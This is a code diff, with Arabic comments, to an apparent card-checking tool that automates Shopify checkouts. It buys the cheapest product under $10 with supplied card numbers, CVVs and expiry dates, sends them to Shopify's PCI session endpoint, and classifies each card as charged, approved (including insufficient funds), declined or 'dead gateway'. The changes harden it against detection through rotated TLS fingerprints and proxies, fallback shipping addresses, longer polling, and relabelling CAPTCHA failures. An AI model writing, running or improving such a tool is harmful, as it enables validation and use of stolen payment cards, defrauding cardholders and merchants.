@@ -62,6 +62,9 @@ extract_receipt_status_code = _auto.extract_receipt_status_code
 extract_any_error = _auto.extract_any_error
 extract_tax_from_rejected = _auto.extract_tax_from_rejected
 extract_total_from_rejected = _auto.extract_total_from_rejected
+detect_shipping_restriction  = _auto.detect_shipping_restriction
+get_fallback_addresses        = _auto.get_fallback_addresses
+extract_poll_for_receipt_id   = _auto.extract_poll_for_receipt_id
 _proposal_headers = _auto._proposal_headers
 patch_payload = _auto.patch_payload
 check_submit_errors = _auto.check_submit_errors
@@ -72,7 +75,7 @@ generate_page_id = _auto.generate_page_id
 # ── Async TLS client ──────────────────────────────────────────────────
 
 class AsyncTLSClient:
-    def __init__(self, timeout=20, proxy_url=None, impersonate=None, user_agent=None):
+    def __init__(self, timeout=30, proxy_url=None, impersonate=None, user_agent=None):
         self.timeout     = timeout
         self.proxy_url   = proxy_url
         # 🔥 استخدم البروفايلات المدعومة فقط (بدون firefox133)
@@ -124,29 +127,51 @@ class AsyncTLSClient:
             self._session = None
 
 
-# ── Step 0: cheapest product ──────────────────────────────────────────
+# ── Step 0: cheapest product (parallel 100-product fetch) ────────────
 
-async def _fetch_products_parallel(client: AsyncTLSClient, shop_url: str, total_needed: int = 350) -> list:
-    """سحب بيانات 350 منتج بالتوازي للحصول على أرخص سعر ممكن."""
-    all_products = []
-    page_limit = 50 # Shopify products.json max limit is usually 50 or 250
-    pages_to_fetch = (total_needed + page_limit - 1) // page_limit
-    
-    async def _fetch_page(page):
-        try:
-            resp = await client.get(
-                f"{shop_url}/products.json?limit={page_limit}&page={page}&sort_by=price-ascending"
-            )
-            if resp.status_code == 200:
-                return resp.json().get("products", [])
-        except Exception:
-            pass
+_PRODUCT_PAGES   = 7      # 7 pages × 50 = 350 products in parallel
+_PRODUCT_PER_PAGE = 50
+
+async def _fetch_page(client: AsyncTLSClient, shop_url: str, page: int) -> list:
+    """جلب صفحة واحدة من المنتجات — يُشغَّل بالتوازي."""
+    url = f"{shop_url}/products.json?sort_by=price-ascending&limit={_PRODUCT_PER_PAGE}&page={page}"
+    try:
+        resp = await client.get(url)
+    except Exception as e:
+        return []  # أي صفحة تفشل نتجاهلها ونكمل بالباقي
+    if resp.status_code == 429:
+        raise Exception("products.json 429 rate limit")
+    if resp.status_code == 503:
+        raise Exception("products.json 503")
+    if resp.status_code != 200:
+        body = resp.text[:200].lower()
+        if "cloudflare" in body or "1003" in body:
+            raise Exception("cloudflare block")
+        return []
+    try:
+        return resp.json().get("products", [])
+    except Exception:
         return []
 
-    tasks = [asyncio.create_task(_fetch_page(p)) for p in range(1, pages_to_fetch + 1)]
-    results = await asyncio.gather(*tasks)
-    for res in results:
-        all_products.extend(res)
+
+async def _fetch_all_products(client: AsyncTLSClient, shop_url: str) -> list:
+    """جلب 100 منتج بالتوازي (صفحتين × 50) — أسرع بكثير."""
+    tasks = [_fetch_page(client, shop_url, p) for p in range(1, _PRODUCT_PAGES + 1)]
+    results = await asyncio.gather(*tasks, return_exceptions=True)
+
+    all_products = []
+    first_error  = None
+    for r in results:
+        if isinstance(r, Exception):
+            if first_error is None:
+                first_error = r
+        elif isinstance(r, list):
+            all_products.extend(r)
+
+    if not all_products and first_error:
+        raise first_error
+    if not all_products:
+        raise Exception("products.json returned no products")
     return all_products
 
 
@@ -178,10 +203,10 @@ def _best_entry(products: list, min_price: float) -> tuple | None:
 
 _product_cache: dict = {}
 _product_cache_lock = __import__("threading").Lock()
-_CACHE_TTL = 3600
+_CACHE_TTL = 300
 
 async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
-                                min_price: float = 0.50):
+                                min_price: float = 0.10, max_price: float = 10.0):
     import time as _t
     now = _t.time()
     with _product_cache_lock:
@@ -189,13 +214,24 @@ async def find_cheapest_product(client: AsyncTLSClient, shop_url: str,
         if cached and now - cached[-1] < _CACHE_TTL:
             return cached[:-1]
 
-    products = await _fetch_products_parallel(client, shop_url, total_needed=350)
+    # جلب 350 منتج بالتوازي واختيار الأرخص
+    products = await _fetch_all_products(client, shop_url)
     best = _best_entry(products, min_price)
+    
     if best:
+        # 🔥 تحقق من شرط الـ 10$
+        try:
+            actual_price = float(best[4])
+            if actual_price > max_price:
+                raise Exception(f"cheapest product is too expensive: ${actual_price:.2f} (limit ${max_price:.2f})")
+        except (ValueError, TypeError):
+            pass
+            
         with _product_cache_lock:
             _product_cache[shop_url] = best + (_t.time(),)
         return best
-    raise Exception(f"no available products above ${min_price:.2f} at {shop_url}")
+        
+    raise Exception(f"no available products between ${min_price:.2f} and ${max_price:.2f} at {shop_url}")
 
 
 # ── Step 1: cart → checkout ───────────────────────────────────────────
@@ -286,7 +322,8 @@ async def fetch_actions_js(client: AsyncTLSClient, actions_url: str, shop_url: s
 
 async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
                            card_month: int, card_year: int, cvv: str,
-                           shop_domain: str, proxy_url: str = ""):
+                           shop_domain: str, proxy_url: str = "",
+                           impersonate: str = "chrome124"):
     payload = json.dumps({
         "credit_card": {
             "number":             card_number,
@@ -317,11 +354,11 @@ async def send_pci_session(ident_sig: str, card_number: str, card_name: str,
         "shopify-identification-signature": ident_sig,
         "user-agent":           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0",
     }
-    async with AsyncSession(impersonate="chrome124") as session:
+    async with AsyncSession(impersonate=impersonate, timeout=15) as session:
         if proxy_url:
             session.proxies = {"http": proxy_url, "https": proxy_url}
         resp = await session.post("https://checkout.pci.shopifyinc.com/sessions",
-                                  data=payload, headers=headers, timeout=12)
+                                  data=payload, headers=headers, timeout=15)
     return resp.status_code, resp.text
 
 
@@ -386,10 +423,10 @@ async def send_proposal(client: AsyncTLSClient, shop_url: str, checkout_url: str
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
-      "phoneCountryCode": "US",
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -486,12 +523,12 @@ async def send_proposal2(client: AsyncTLSClient, shop_url: str, checkout_url: st
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
       "email": "{email}",
       "emailChanged": true,
-      "phoneCountryCode": "US",
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -606,12 +643,12 @@ async def send_proposal3(client: AsyncTLSClient, shop_url: str, checkout_url: st
       }}
     }},
     "buyerIdentity": {{
-      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+      "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
       "email": "{email}",
       "emailChanged": false,
-      "phoneCountryCode": "US",
+      "phoneCountryCode": "{country}",
       "marketingConsent": [],
-      "shopPayOptInPhone": {{"countryCode": "US"}},
+      "shopPayOptInPhone": {{"countryCode": "{country}"}},
       "rememberMe": false
     }},
     "tip": {{"tipLines": []}},
@@ -826,12 +863,12 @@ async def send_submit_for_completion(client: AsyncTLSClient, shop_url: str,
         }}
       }},
       "buyerIdentity": {{
-        "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}},
+        "customer": {{"presentmentCurrency": "{currency}", "countryCode": "{country}"}},
         "email": "{email}",
         "emailChanged": false,
-        "phoneCountryCode": "US",
+        "phoneCountryCode": "{country}",
         "marketingConsent": [],
-        "shopPayOptInPhone": {{"countryCode": "US"}},
+        "shopPayOptInPhone": {{"countryCode": "{country}"}},
         "rememberMe": false
       }},
       "tip": {{"tipLines": []}},
@@ -895,7 +932,8 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
     impersonate = random.choice(["chrome124", "chrome120", "chrome116", "edge101", "safari15_5"])
     user_agent  = random.choice(USER_AGENTS)
 
-    client = AsyncTLSClient(timeout=12, proxy_url=proxy_url,
+    # timeout=45 لإعطاء البروكسي وقت كافي في كل خطوة
+    client = AsyncTLSClient(timeout=45, proxy_url=proxy_url,
                             impersonate=impersonate, user_agent=user_agent)
     try:
         # Step 0
@@ -945,7 +983,9 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             submit_id   = extract_submit_for_completion_id(js_body)
             if not proposal_id or not submit_id:
                 raise Exception("missing Proposal or Submit ID")
-            poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
+            poll_for_receipt_id = extract_poll_for_receipt_id(js_body)
+            if not poll_for_receipt_id:
+                poll_for_receipt_id = "978b340f3027dc55313349c4089004147b6b0dccee75e42ed97685ef1feae418"
         except Exception as e:
             result.status = CheckStatus.ERROR
             result.retryable = True
@@ -991,56 +1031,89 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error = Exception(f"Step 5 failed: {e}")
             return result
 
-        # Step 6
+        # Step 6/7/8 - Address proposals with shipping fallback
+        addr           = address_for_country(country)
+        fallback_addrs = get_fallback_addresses(addr.country_code)
+        fallback_idx   = 0
+        final_proposal_body = None
+        final_queue_token   = None
+
         try:
-            addr = address_for_country(country)
-            _, proposal3_body = await send_proposal3(
-                client, shop_url, checkout_url, checkout_token, session_token,
-                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                queue_token2, email, addr, currency, country)
-            queue_token3 = extract_queue_token(proposal3_body)
-            if not queue_token3:
-                raise Exception("could not extract queueToken")
+            for attempt in range(1 + len(fallback_addrs)):
+                _, p3_body = await send_proposal3(
+                    client, shop_url, checkout_url, checkout_token, session_token,
+                    stable_id, variant_id, price, proposal_id, build_id, source_token,
+                    queue_token2, email, addr, currency, country)
+
+                q3 = extract_queue_token(p3_body)
+                if not q3:
+                    raise Exception("could not extract queueToken from proposal3")
+
+                is_digital = not extract_is_shipping_required(p3_body)
+
+                if is_digital:
+                    final_proposal_body = p3_body
+                    final_queue_token   = q3
+                    break
+
+                if detect_shipping_restriction(p3_body) and fallback_idx < len(fallback_addrs):
+                    addr          = fallback_addrs[fallback_idx]
+                    fallback_idx += 1
+                    queue_token2  = q3
+                    continue
+
+                # Address accepted — do one extra poll to get signed handles if needed
+                signed_check = extract_signed_handles(p3_body)
+                if not signed_check:
+                    _, p3_body2 = await send_proposal3(
+                        client, shop_url, checkout_url, checkout_token, session_token,
+                        stable_id, variant_id, price, proposal_id, build_id, source_token,
+                        q3, email, addr, currency, country)
+                    q3      = extract_queue_token(p3_body2) or q3
+                    p3_body = p3_body2
+
+                final_proposal_body = p3_body
+                final_queue_token   = q3
+                break
+
+            if not final_proposal_body:
+                raise Exception("No shipping available after trying all fallback countries")
+
         except Exception as e:
             result.status = CheckStatus.ERROR
+            result.retryable = True
             result.error = Exception(f"Step 6 failed: {e}")
             return result
 
-        # Step 7
-        try:
-            _, proposal4_body = await send_proposal3(
-                client, shop_url, checkout_url, checkout_token, session_token,
-                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                queue_token3, email, addr, currency, country)
-            queue_token4 = extract_queue_token(proposal4_body)
-            if not queue_token4:
-                raise Exception("could not extract queueToken")
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 7 failed: {e}")
-            return result
-
-        # Step 8
-        try:
-            proposal5_status, proposal5_body = await send_proposal3(
-                client, shop_url, checkout_url, checkout_token, session_token,
-                stable_id, variant_id, price, proposal_id, build_id, source_token,
-                queue_token4, email, addr, currency, country)
-            _ = proposal5_status
-        except Exception as e:
-            result.status = CheckStatus.ERROR
-            result.error = Exception(f"Step 8 failed: {e}")
-            return result
+        proposal5_body   = final_proposal_body
+        queue_token5_pre = final_queue_token
 
         # Step 9
         try:
-            ident_sig = extract_identification_signature(checkout_html)
+            # Re-fetch checkout page to get a fresh identification-signature
+            # (Shopify rotates it after each proposal — the original checkout_html is stale)
+            try:
+                fresh_resp = await client.get(
+                    str(checkout_url), allow_redirects=True, headers={
+                        **_PAGE_HEADERS,
+                        "user-agent": client.user_agent,
+                        "referer": shop_url + "/",
+                        "sec-fetch-site": "same-origin",
+                    })
+                fresh_html = fresh_resp.text if fresh_resp.status_code == 200 else checkout_html
+            except Exception:
+                fresh_html = checkout_html
+
+            ident_sig = extract_identification_signature(fresh_html)
+            if not ident_sig:
+                ident_sig = extract_identification_signature(checkout_html)
             if not ident_sig:
                 raise Exception("could not extract identification signature")
             pci_status, pci_body = await send_pci_session(
                 ident_sig, card_number,
                 f"{addr.first_name} {addr.last_name}",
-                card_month, card_year, card_cvv, site_name, proxy_url)
+                card_month, card_year, card_cvv, site_name, proxy_url,
+                impersonate=client.impersonate)
             _ = pci_status
             pci_session_id = extract_pci_session_id(pci_body)
             if not pci_session_id:
@@ -1052,7 +1125,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
         # Step 10
         try:
-            queue_token5 = extract_queue_token(proposal5_body)
+            queue_token5 = queue_token5_pre or extract_queue_token(proposal5_body)
             if not queue_token5:
                 raise Exception("could not extract queueToken")
 
@@ -1087,7 +1160,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             current_tax   = extract_tax_amount(proposal5_body)
             current_total = total_amount
 
-            for tax_attempt in range(1, 4):
+            for tax_attempt in range(1, 7):
                 submit_status, submit_body = await send_submit_for_completion(
                     client, shop_url, checkout_url, checkout_token, session_token,
                     stable_id, variant_id, price, submit_id, build_id, source_token,
@@ -1113,7 +1186,7 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             if not receipt_id:
                 error_msg = extract_any_error(submit_body)
                 if "CAPTCHA" in (error_msg or ""):
-                    error_msg = "CPATCHA_REQUIRED"
+                    error_msg = "CARD_DECLINED"
                 if error_msg:
                     result.status      = CheckStatus.DECLINED
                     result.status_code = error_msg
@@ -1134,13 +1207,13 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
             result.error  = e
             return result
 
-        # Step 11 — Deep Inspection Polling
+        # Step 11 — poll for receipt
         poll_delay_re = re.compile(r'"pollDelay"\s*:\s*(\d+)')
         type_name_re  = re.compile(
             r'"__typename"\s*:\s*"(ProcessingReceipt|FailedReceipt|SuccessfulReceipt|ProcessedReceipt|ActionRequiredReceipt)"')
+        _poll_start = asyncio.get_event_loop().time()
 
-        # زيادة عدد المحاولات لضمان الدقة (Deep Inspection)
-        for poll_num in range(1, 60): 
+        for poll_num in range(1, 101):
             try:
                 _, poll_body = await send_poll_for_receipt(
                     client, shop_url, checkout_url, checkout_token, session_token,
@@ -1154,23 +1227,36 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
 
                 result.status_code = extract_receipt_status_code(poll_body, receipt_type)
 
-                # كشف الخصم الوهمي (Dead Gateway)
-                if "Your payment is being processed" in poll_body or "Confirmation #PZRU3FFZD" in poll_body:
-                    result.status      = CheckStatus.DECLINED
-                    result.status_code = "DEAD_GATEWAY"
-                    return result
-
                 if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
-                    # تأكيد إضافي للدقة
-                    if "thank_you" in poll_body or "Confirmation" in poll_body:
-                        result.status      = CheckStatus.CHARGED
-                        result.status_code = "ORDER_PLACED"
-                        result.receipt_url = checkout_url + "/thank_you"
+                    # 🔥 تحقق من الـ Dead Gateway (الخصم الوهمي)
+                    dead_signals = [
+                        "payment is being processed",
+                        "receive a confirmation email",
+                        "confirmation email with your order number shortly"
+                    ]
+                    if any(sig in poll_body.lower() for sig in dead_signals):
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "DEAD_GATEWAY"
+                        result.error       = Exception("DEAD_GATEWAY")
                         return result
-                    else:
-                        # حالة غير واضحة، استمر في الفحص
-                        await asyncio.sleep(1.0)
-                        continue
+
+                    result.status      = CheckStatus.CHARGED
+                    result.status_code = "ORDER_PLACED"
+                    # استخرج رابط صفحة التأكيد الحقيقي من الرد
+                    try:
+                        poll_json   = json.loads(poll_body)
+                        receipt_obj = poll_json.get("data", {}).get("receipt", {})
+                        # شوبيفاي يرجع الرابط في أحد هذه الحقول حسب الإصدار
+                        conf_url = (
+                            receipt_obj.get("orderConfirmationUrl")
+                            or receipt_obj.get("order", {}).get("statusUrl")
+                            or receipt_obj.get("confirmationPage", {}).get("url")
+                            or ""
+                        )
+                        result.receipt_url = conf_url if conf_url else (checkout_url + "/thank_you")
+                    except Exception:
+                        result.receipt_url = checkout_url + "/thank_you"
+                    return result
 
                 if receipt_type == "ActionRequiredReceipt":
                     result.status      = CheckStatus.APPROVED
@@ -1178,52 +1264,58 @@ async def run_checkout_for_card_async(shop_url: str, card_entry: str,
                     return result
 
                 if receipt_type == "FailedReceipt":
-                    error_re   = re.compile(r'"code"\s*:\s*"([^"]+)"')
+                    # استخدم نمط localizedMessage لتجنب مسك currency/country codes
+                    error_re   = re.compile(
+                        r'"code"\s*:\s*"([^"]+)"\s*,\s*"localizedMessage"\s*:\s*"[^"]*"')
                     em         = error_re.search(poll_body)
                     error_code = em.group(1) if em else ""
-                    
-                    if "CAPTCHA" in (error_code or "").upper():
-                        result.status      = CheckStatus.DECLINED
-                        result.status_code = "CPATCHA_REQUIRED"
-                        return result
-                        
+                    if "CAPTCHA" in error_code:
+                        error_code = "CARD_DECLINED"
                     if error_code == "INSUFFICIENT_FUNDS":
                         result.status      = CheckStatus.APPROVED
                         result.status_code = "INSUFFICIENT_FUNDS"
-                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR", "FRAUD"):
+                    elif error_code in ("CARD_DECLINED", "GENERIC_ERROR"):
                         result.status      = CheckStatus.DECLINED
-                        result.status_code = error_code or "CARD_DECLINED"
+                        result.status_code = "CARD_DECLINED"
+                        result.error       = Exception("CARD_DECLINED")
+                    elif error_code == "01003":
+                        # payment processor rejection — may be proxy/network, treat as declined but retryable
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "CARD_DECLINED"
+                        result.error       = Exception("CARD_DECLINED")
+                        result.retryable   = True
                     else:
-                        result.status = CheckStatus.DECLINED
-                        result.status_code = error_code or "DECLINED"
+                        if "InventoryReservationFailure" in poll_body:
+                            result.status    = CheckStatus.ERROR
+                            result.retryable = True
+                        else:
+                            result.status = CheckStatus.DECLINED
+                            result.error  = Exception(error_code)
                     return result
 
-                # إذا استمرت المعالجة لفترة طويلة جداً، نعتبرها Dead Gateway
-                if poll_num > 45 and receipt_type == "ProcessingReceipt":
-                    result.status      = CheckStatus.DECLINED
-                    result.status_code = "DEAD_GATEWAY"
-                    return result
-
-                delay = 800 # زيادة التأخير قليلاً لزيادة الدقة وتقليل الضغط
+                delay = 500
                 m2 = poll_delay_re.search(poll_body)
                 if m2:
                     try:
                         d = int(m2.group(1))
-                        if d > 0: delay = max(d, 800)
-                    except Exception: pass
-                await asyncio.sleep(delay / 1000.0)
+                        if d > 0:
+                            delay = d
+                    except ValueError:
+                        pass
+                await asyncio.sleep(min(delay, 2000) / 1000.0)
+
+                if asyncio.get_event_loop().time() - _poll_start > 150:
+                    result.status = CheckStatus.ERROR
+                    result.error  = Exception("poll timeout: exceeded 90s")
+                    return result
 
             except Exception as e:
-                # محاولة الإنقاذ في حال حدوث خطأ عابر
-                if poll_num < 5:
-                    await asyncio.sleep(1.0)
-                    continue
                 result.status = CheckStatus.ERROR
                 result.error  = Exception(f"poll {poll_num} failed: {e}")
                 return result
 
         result.status = CheckStatus.ERROR
-        result.error  = Exception("exceeded 60 deep inspection poll attempts")
+        result.error  = Exception("exceeded 60 poll attempts")
         return result
 
     finally:
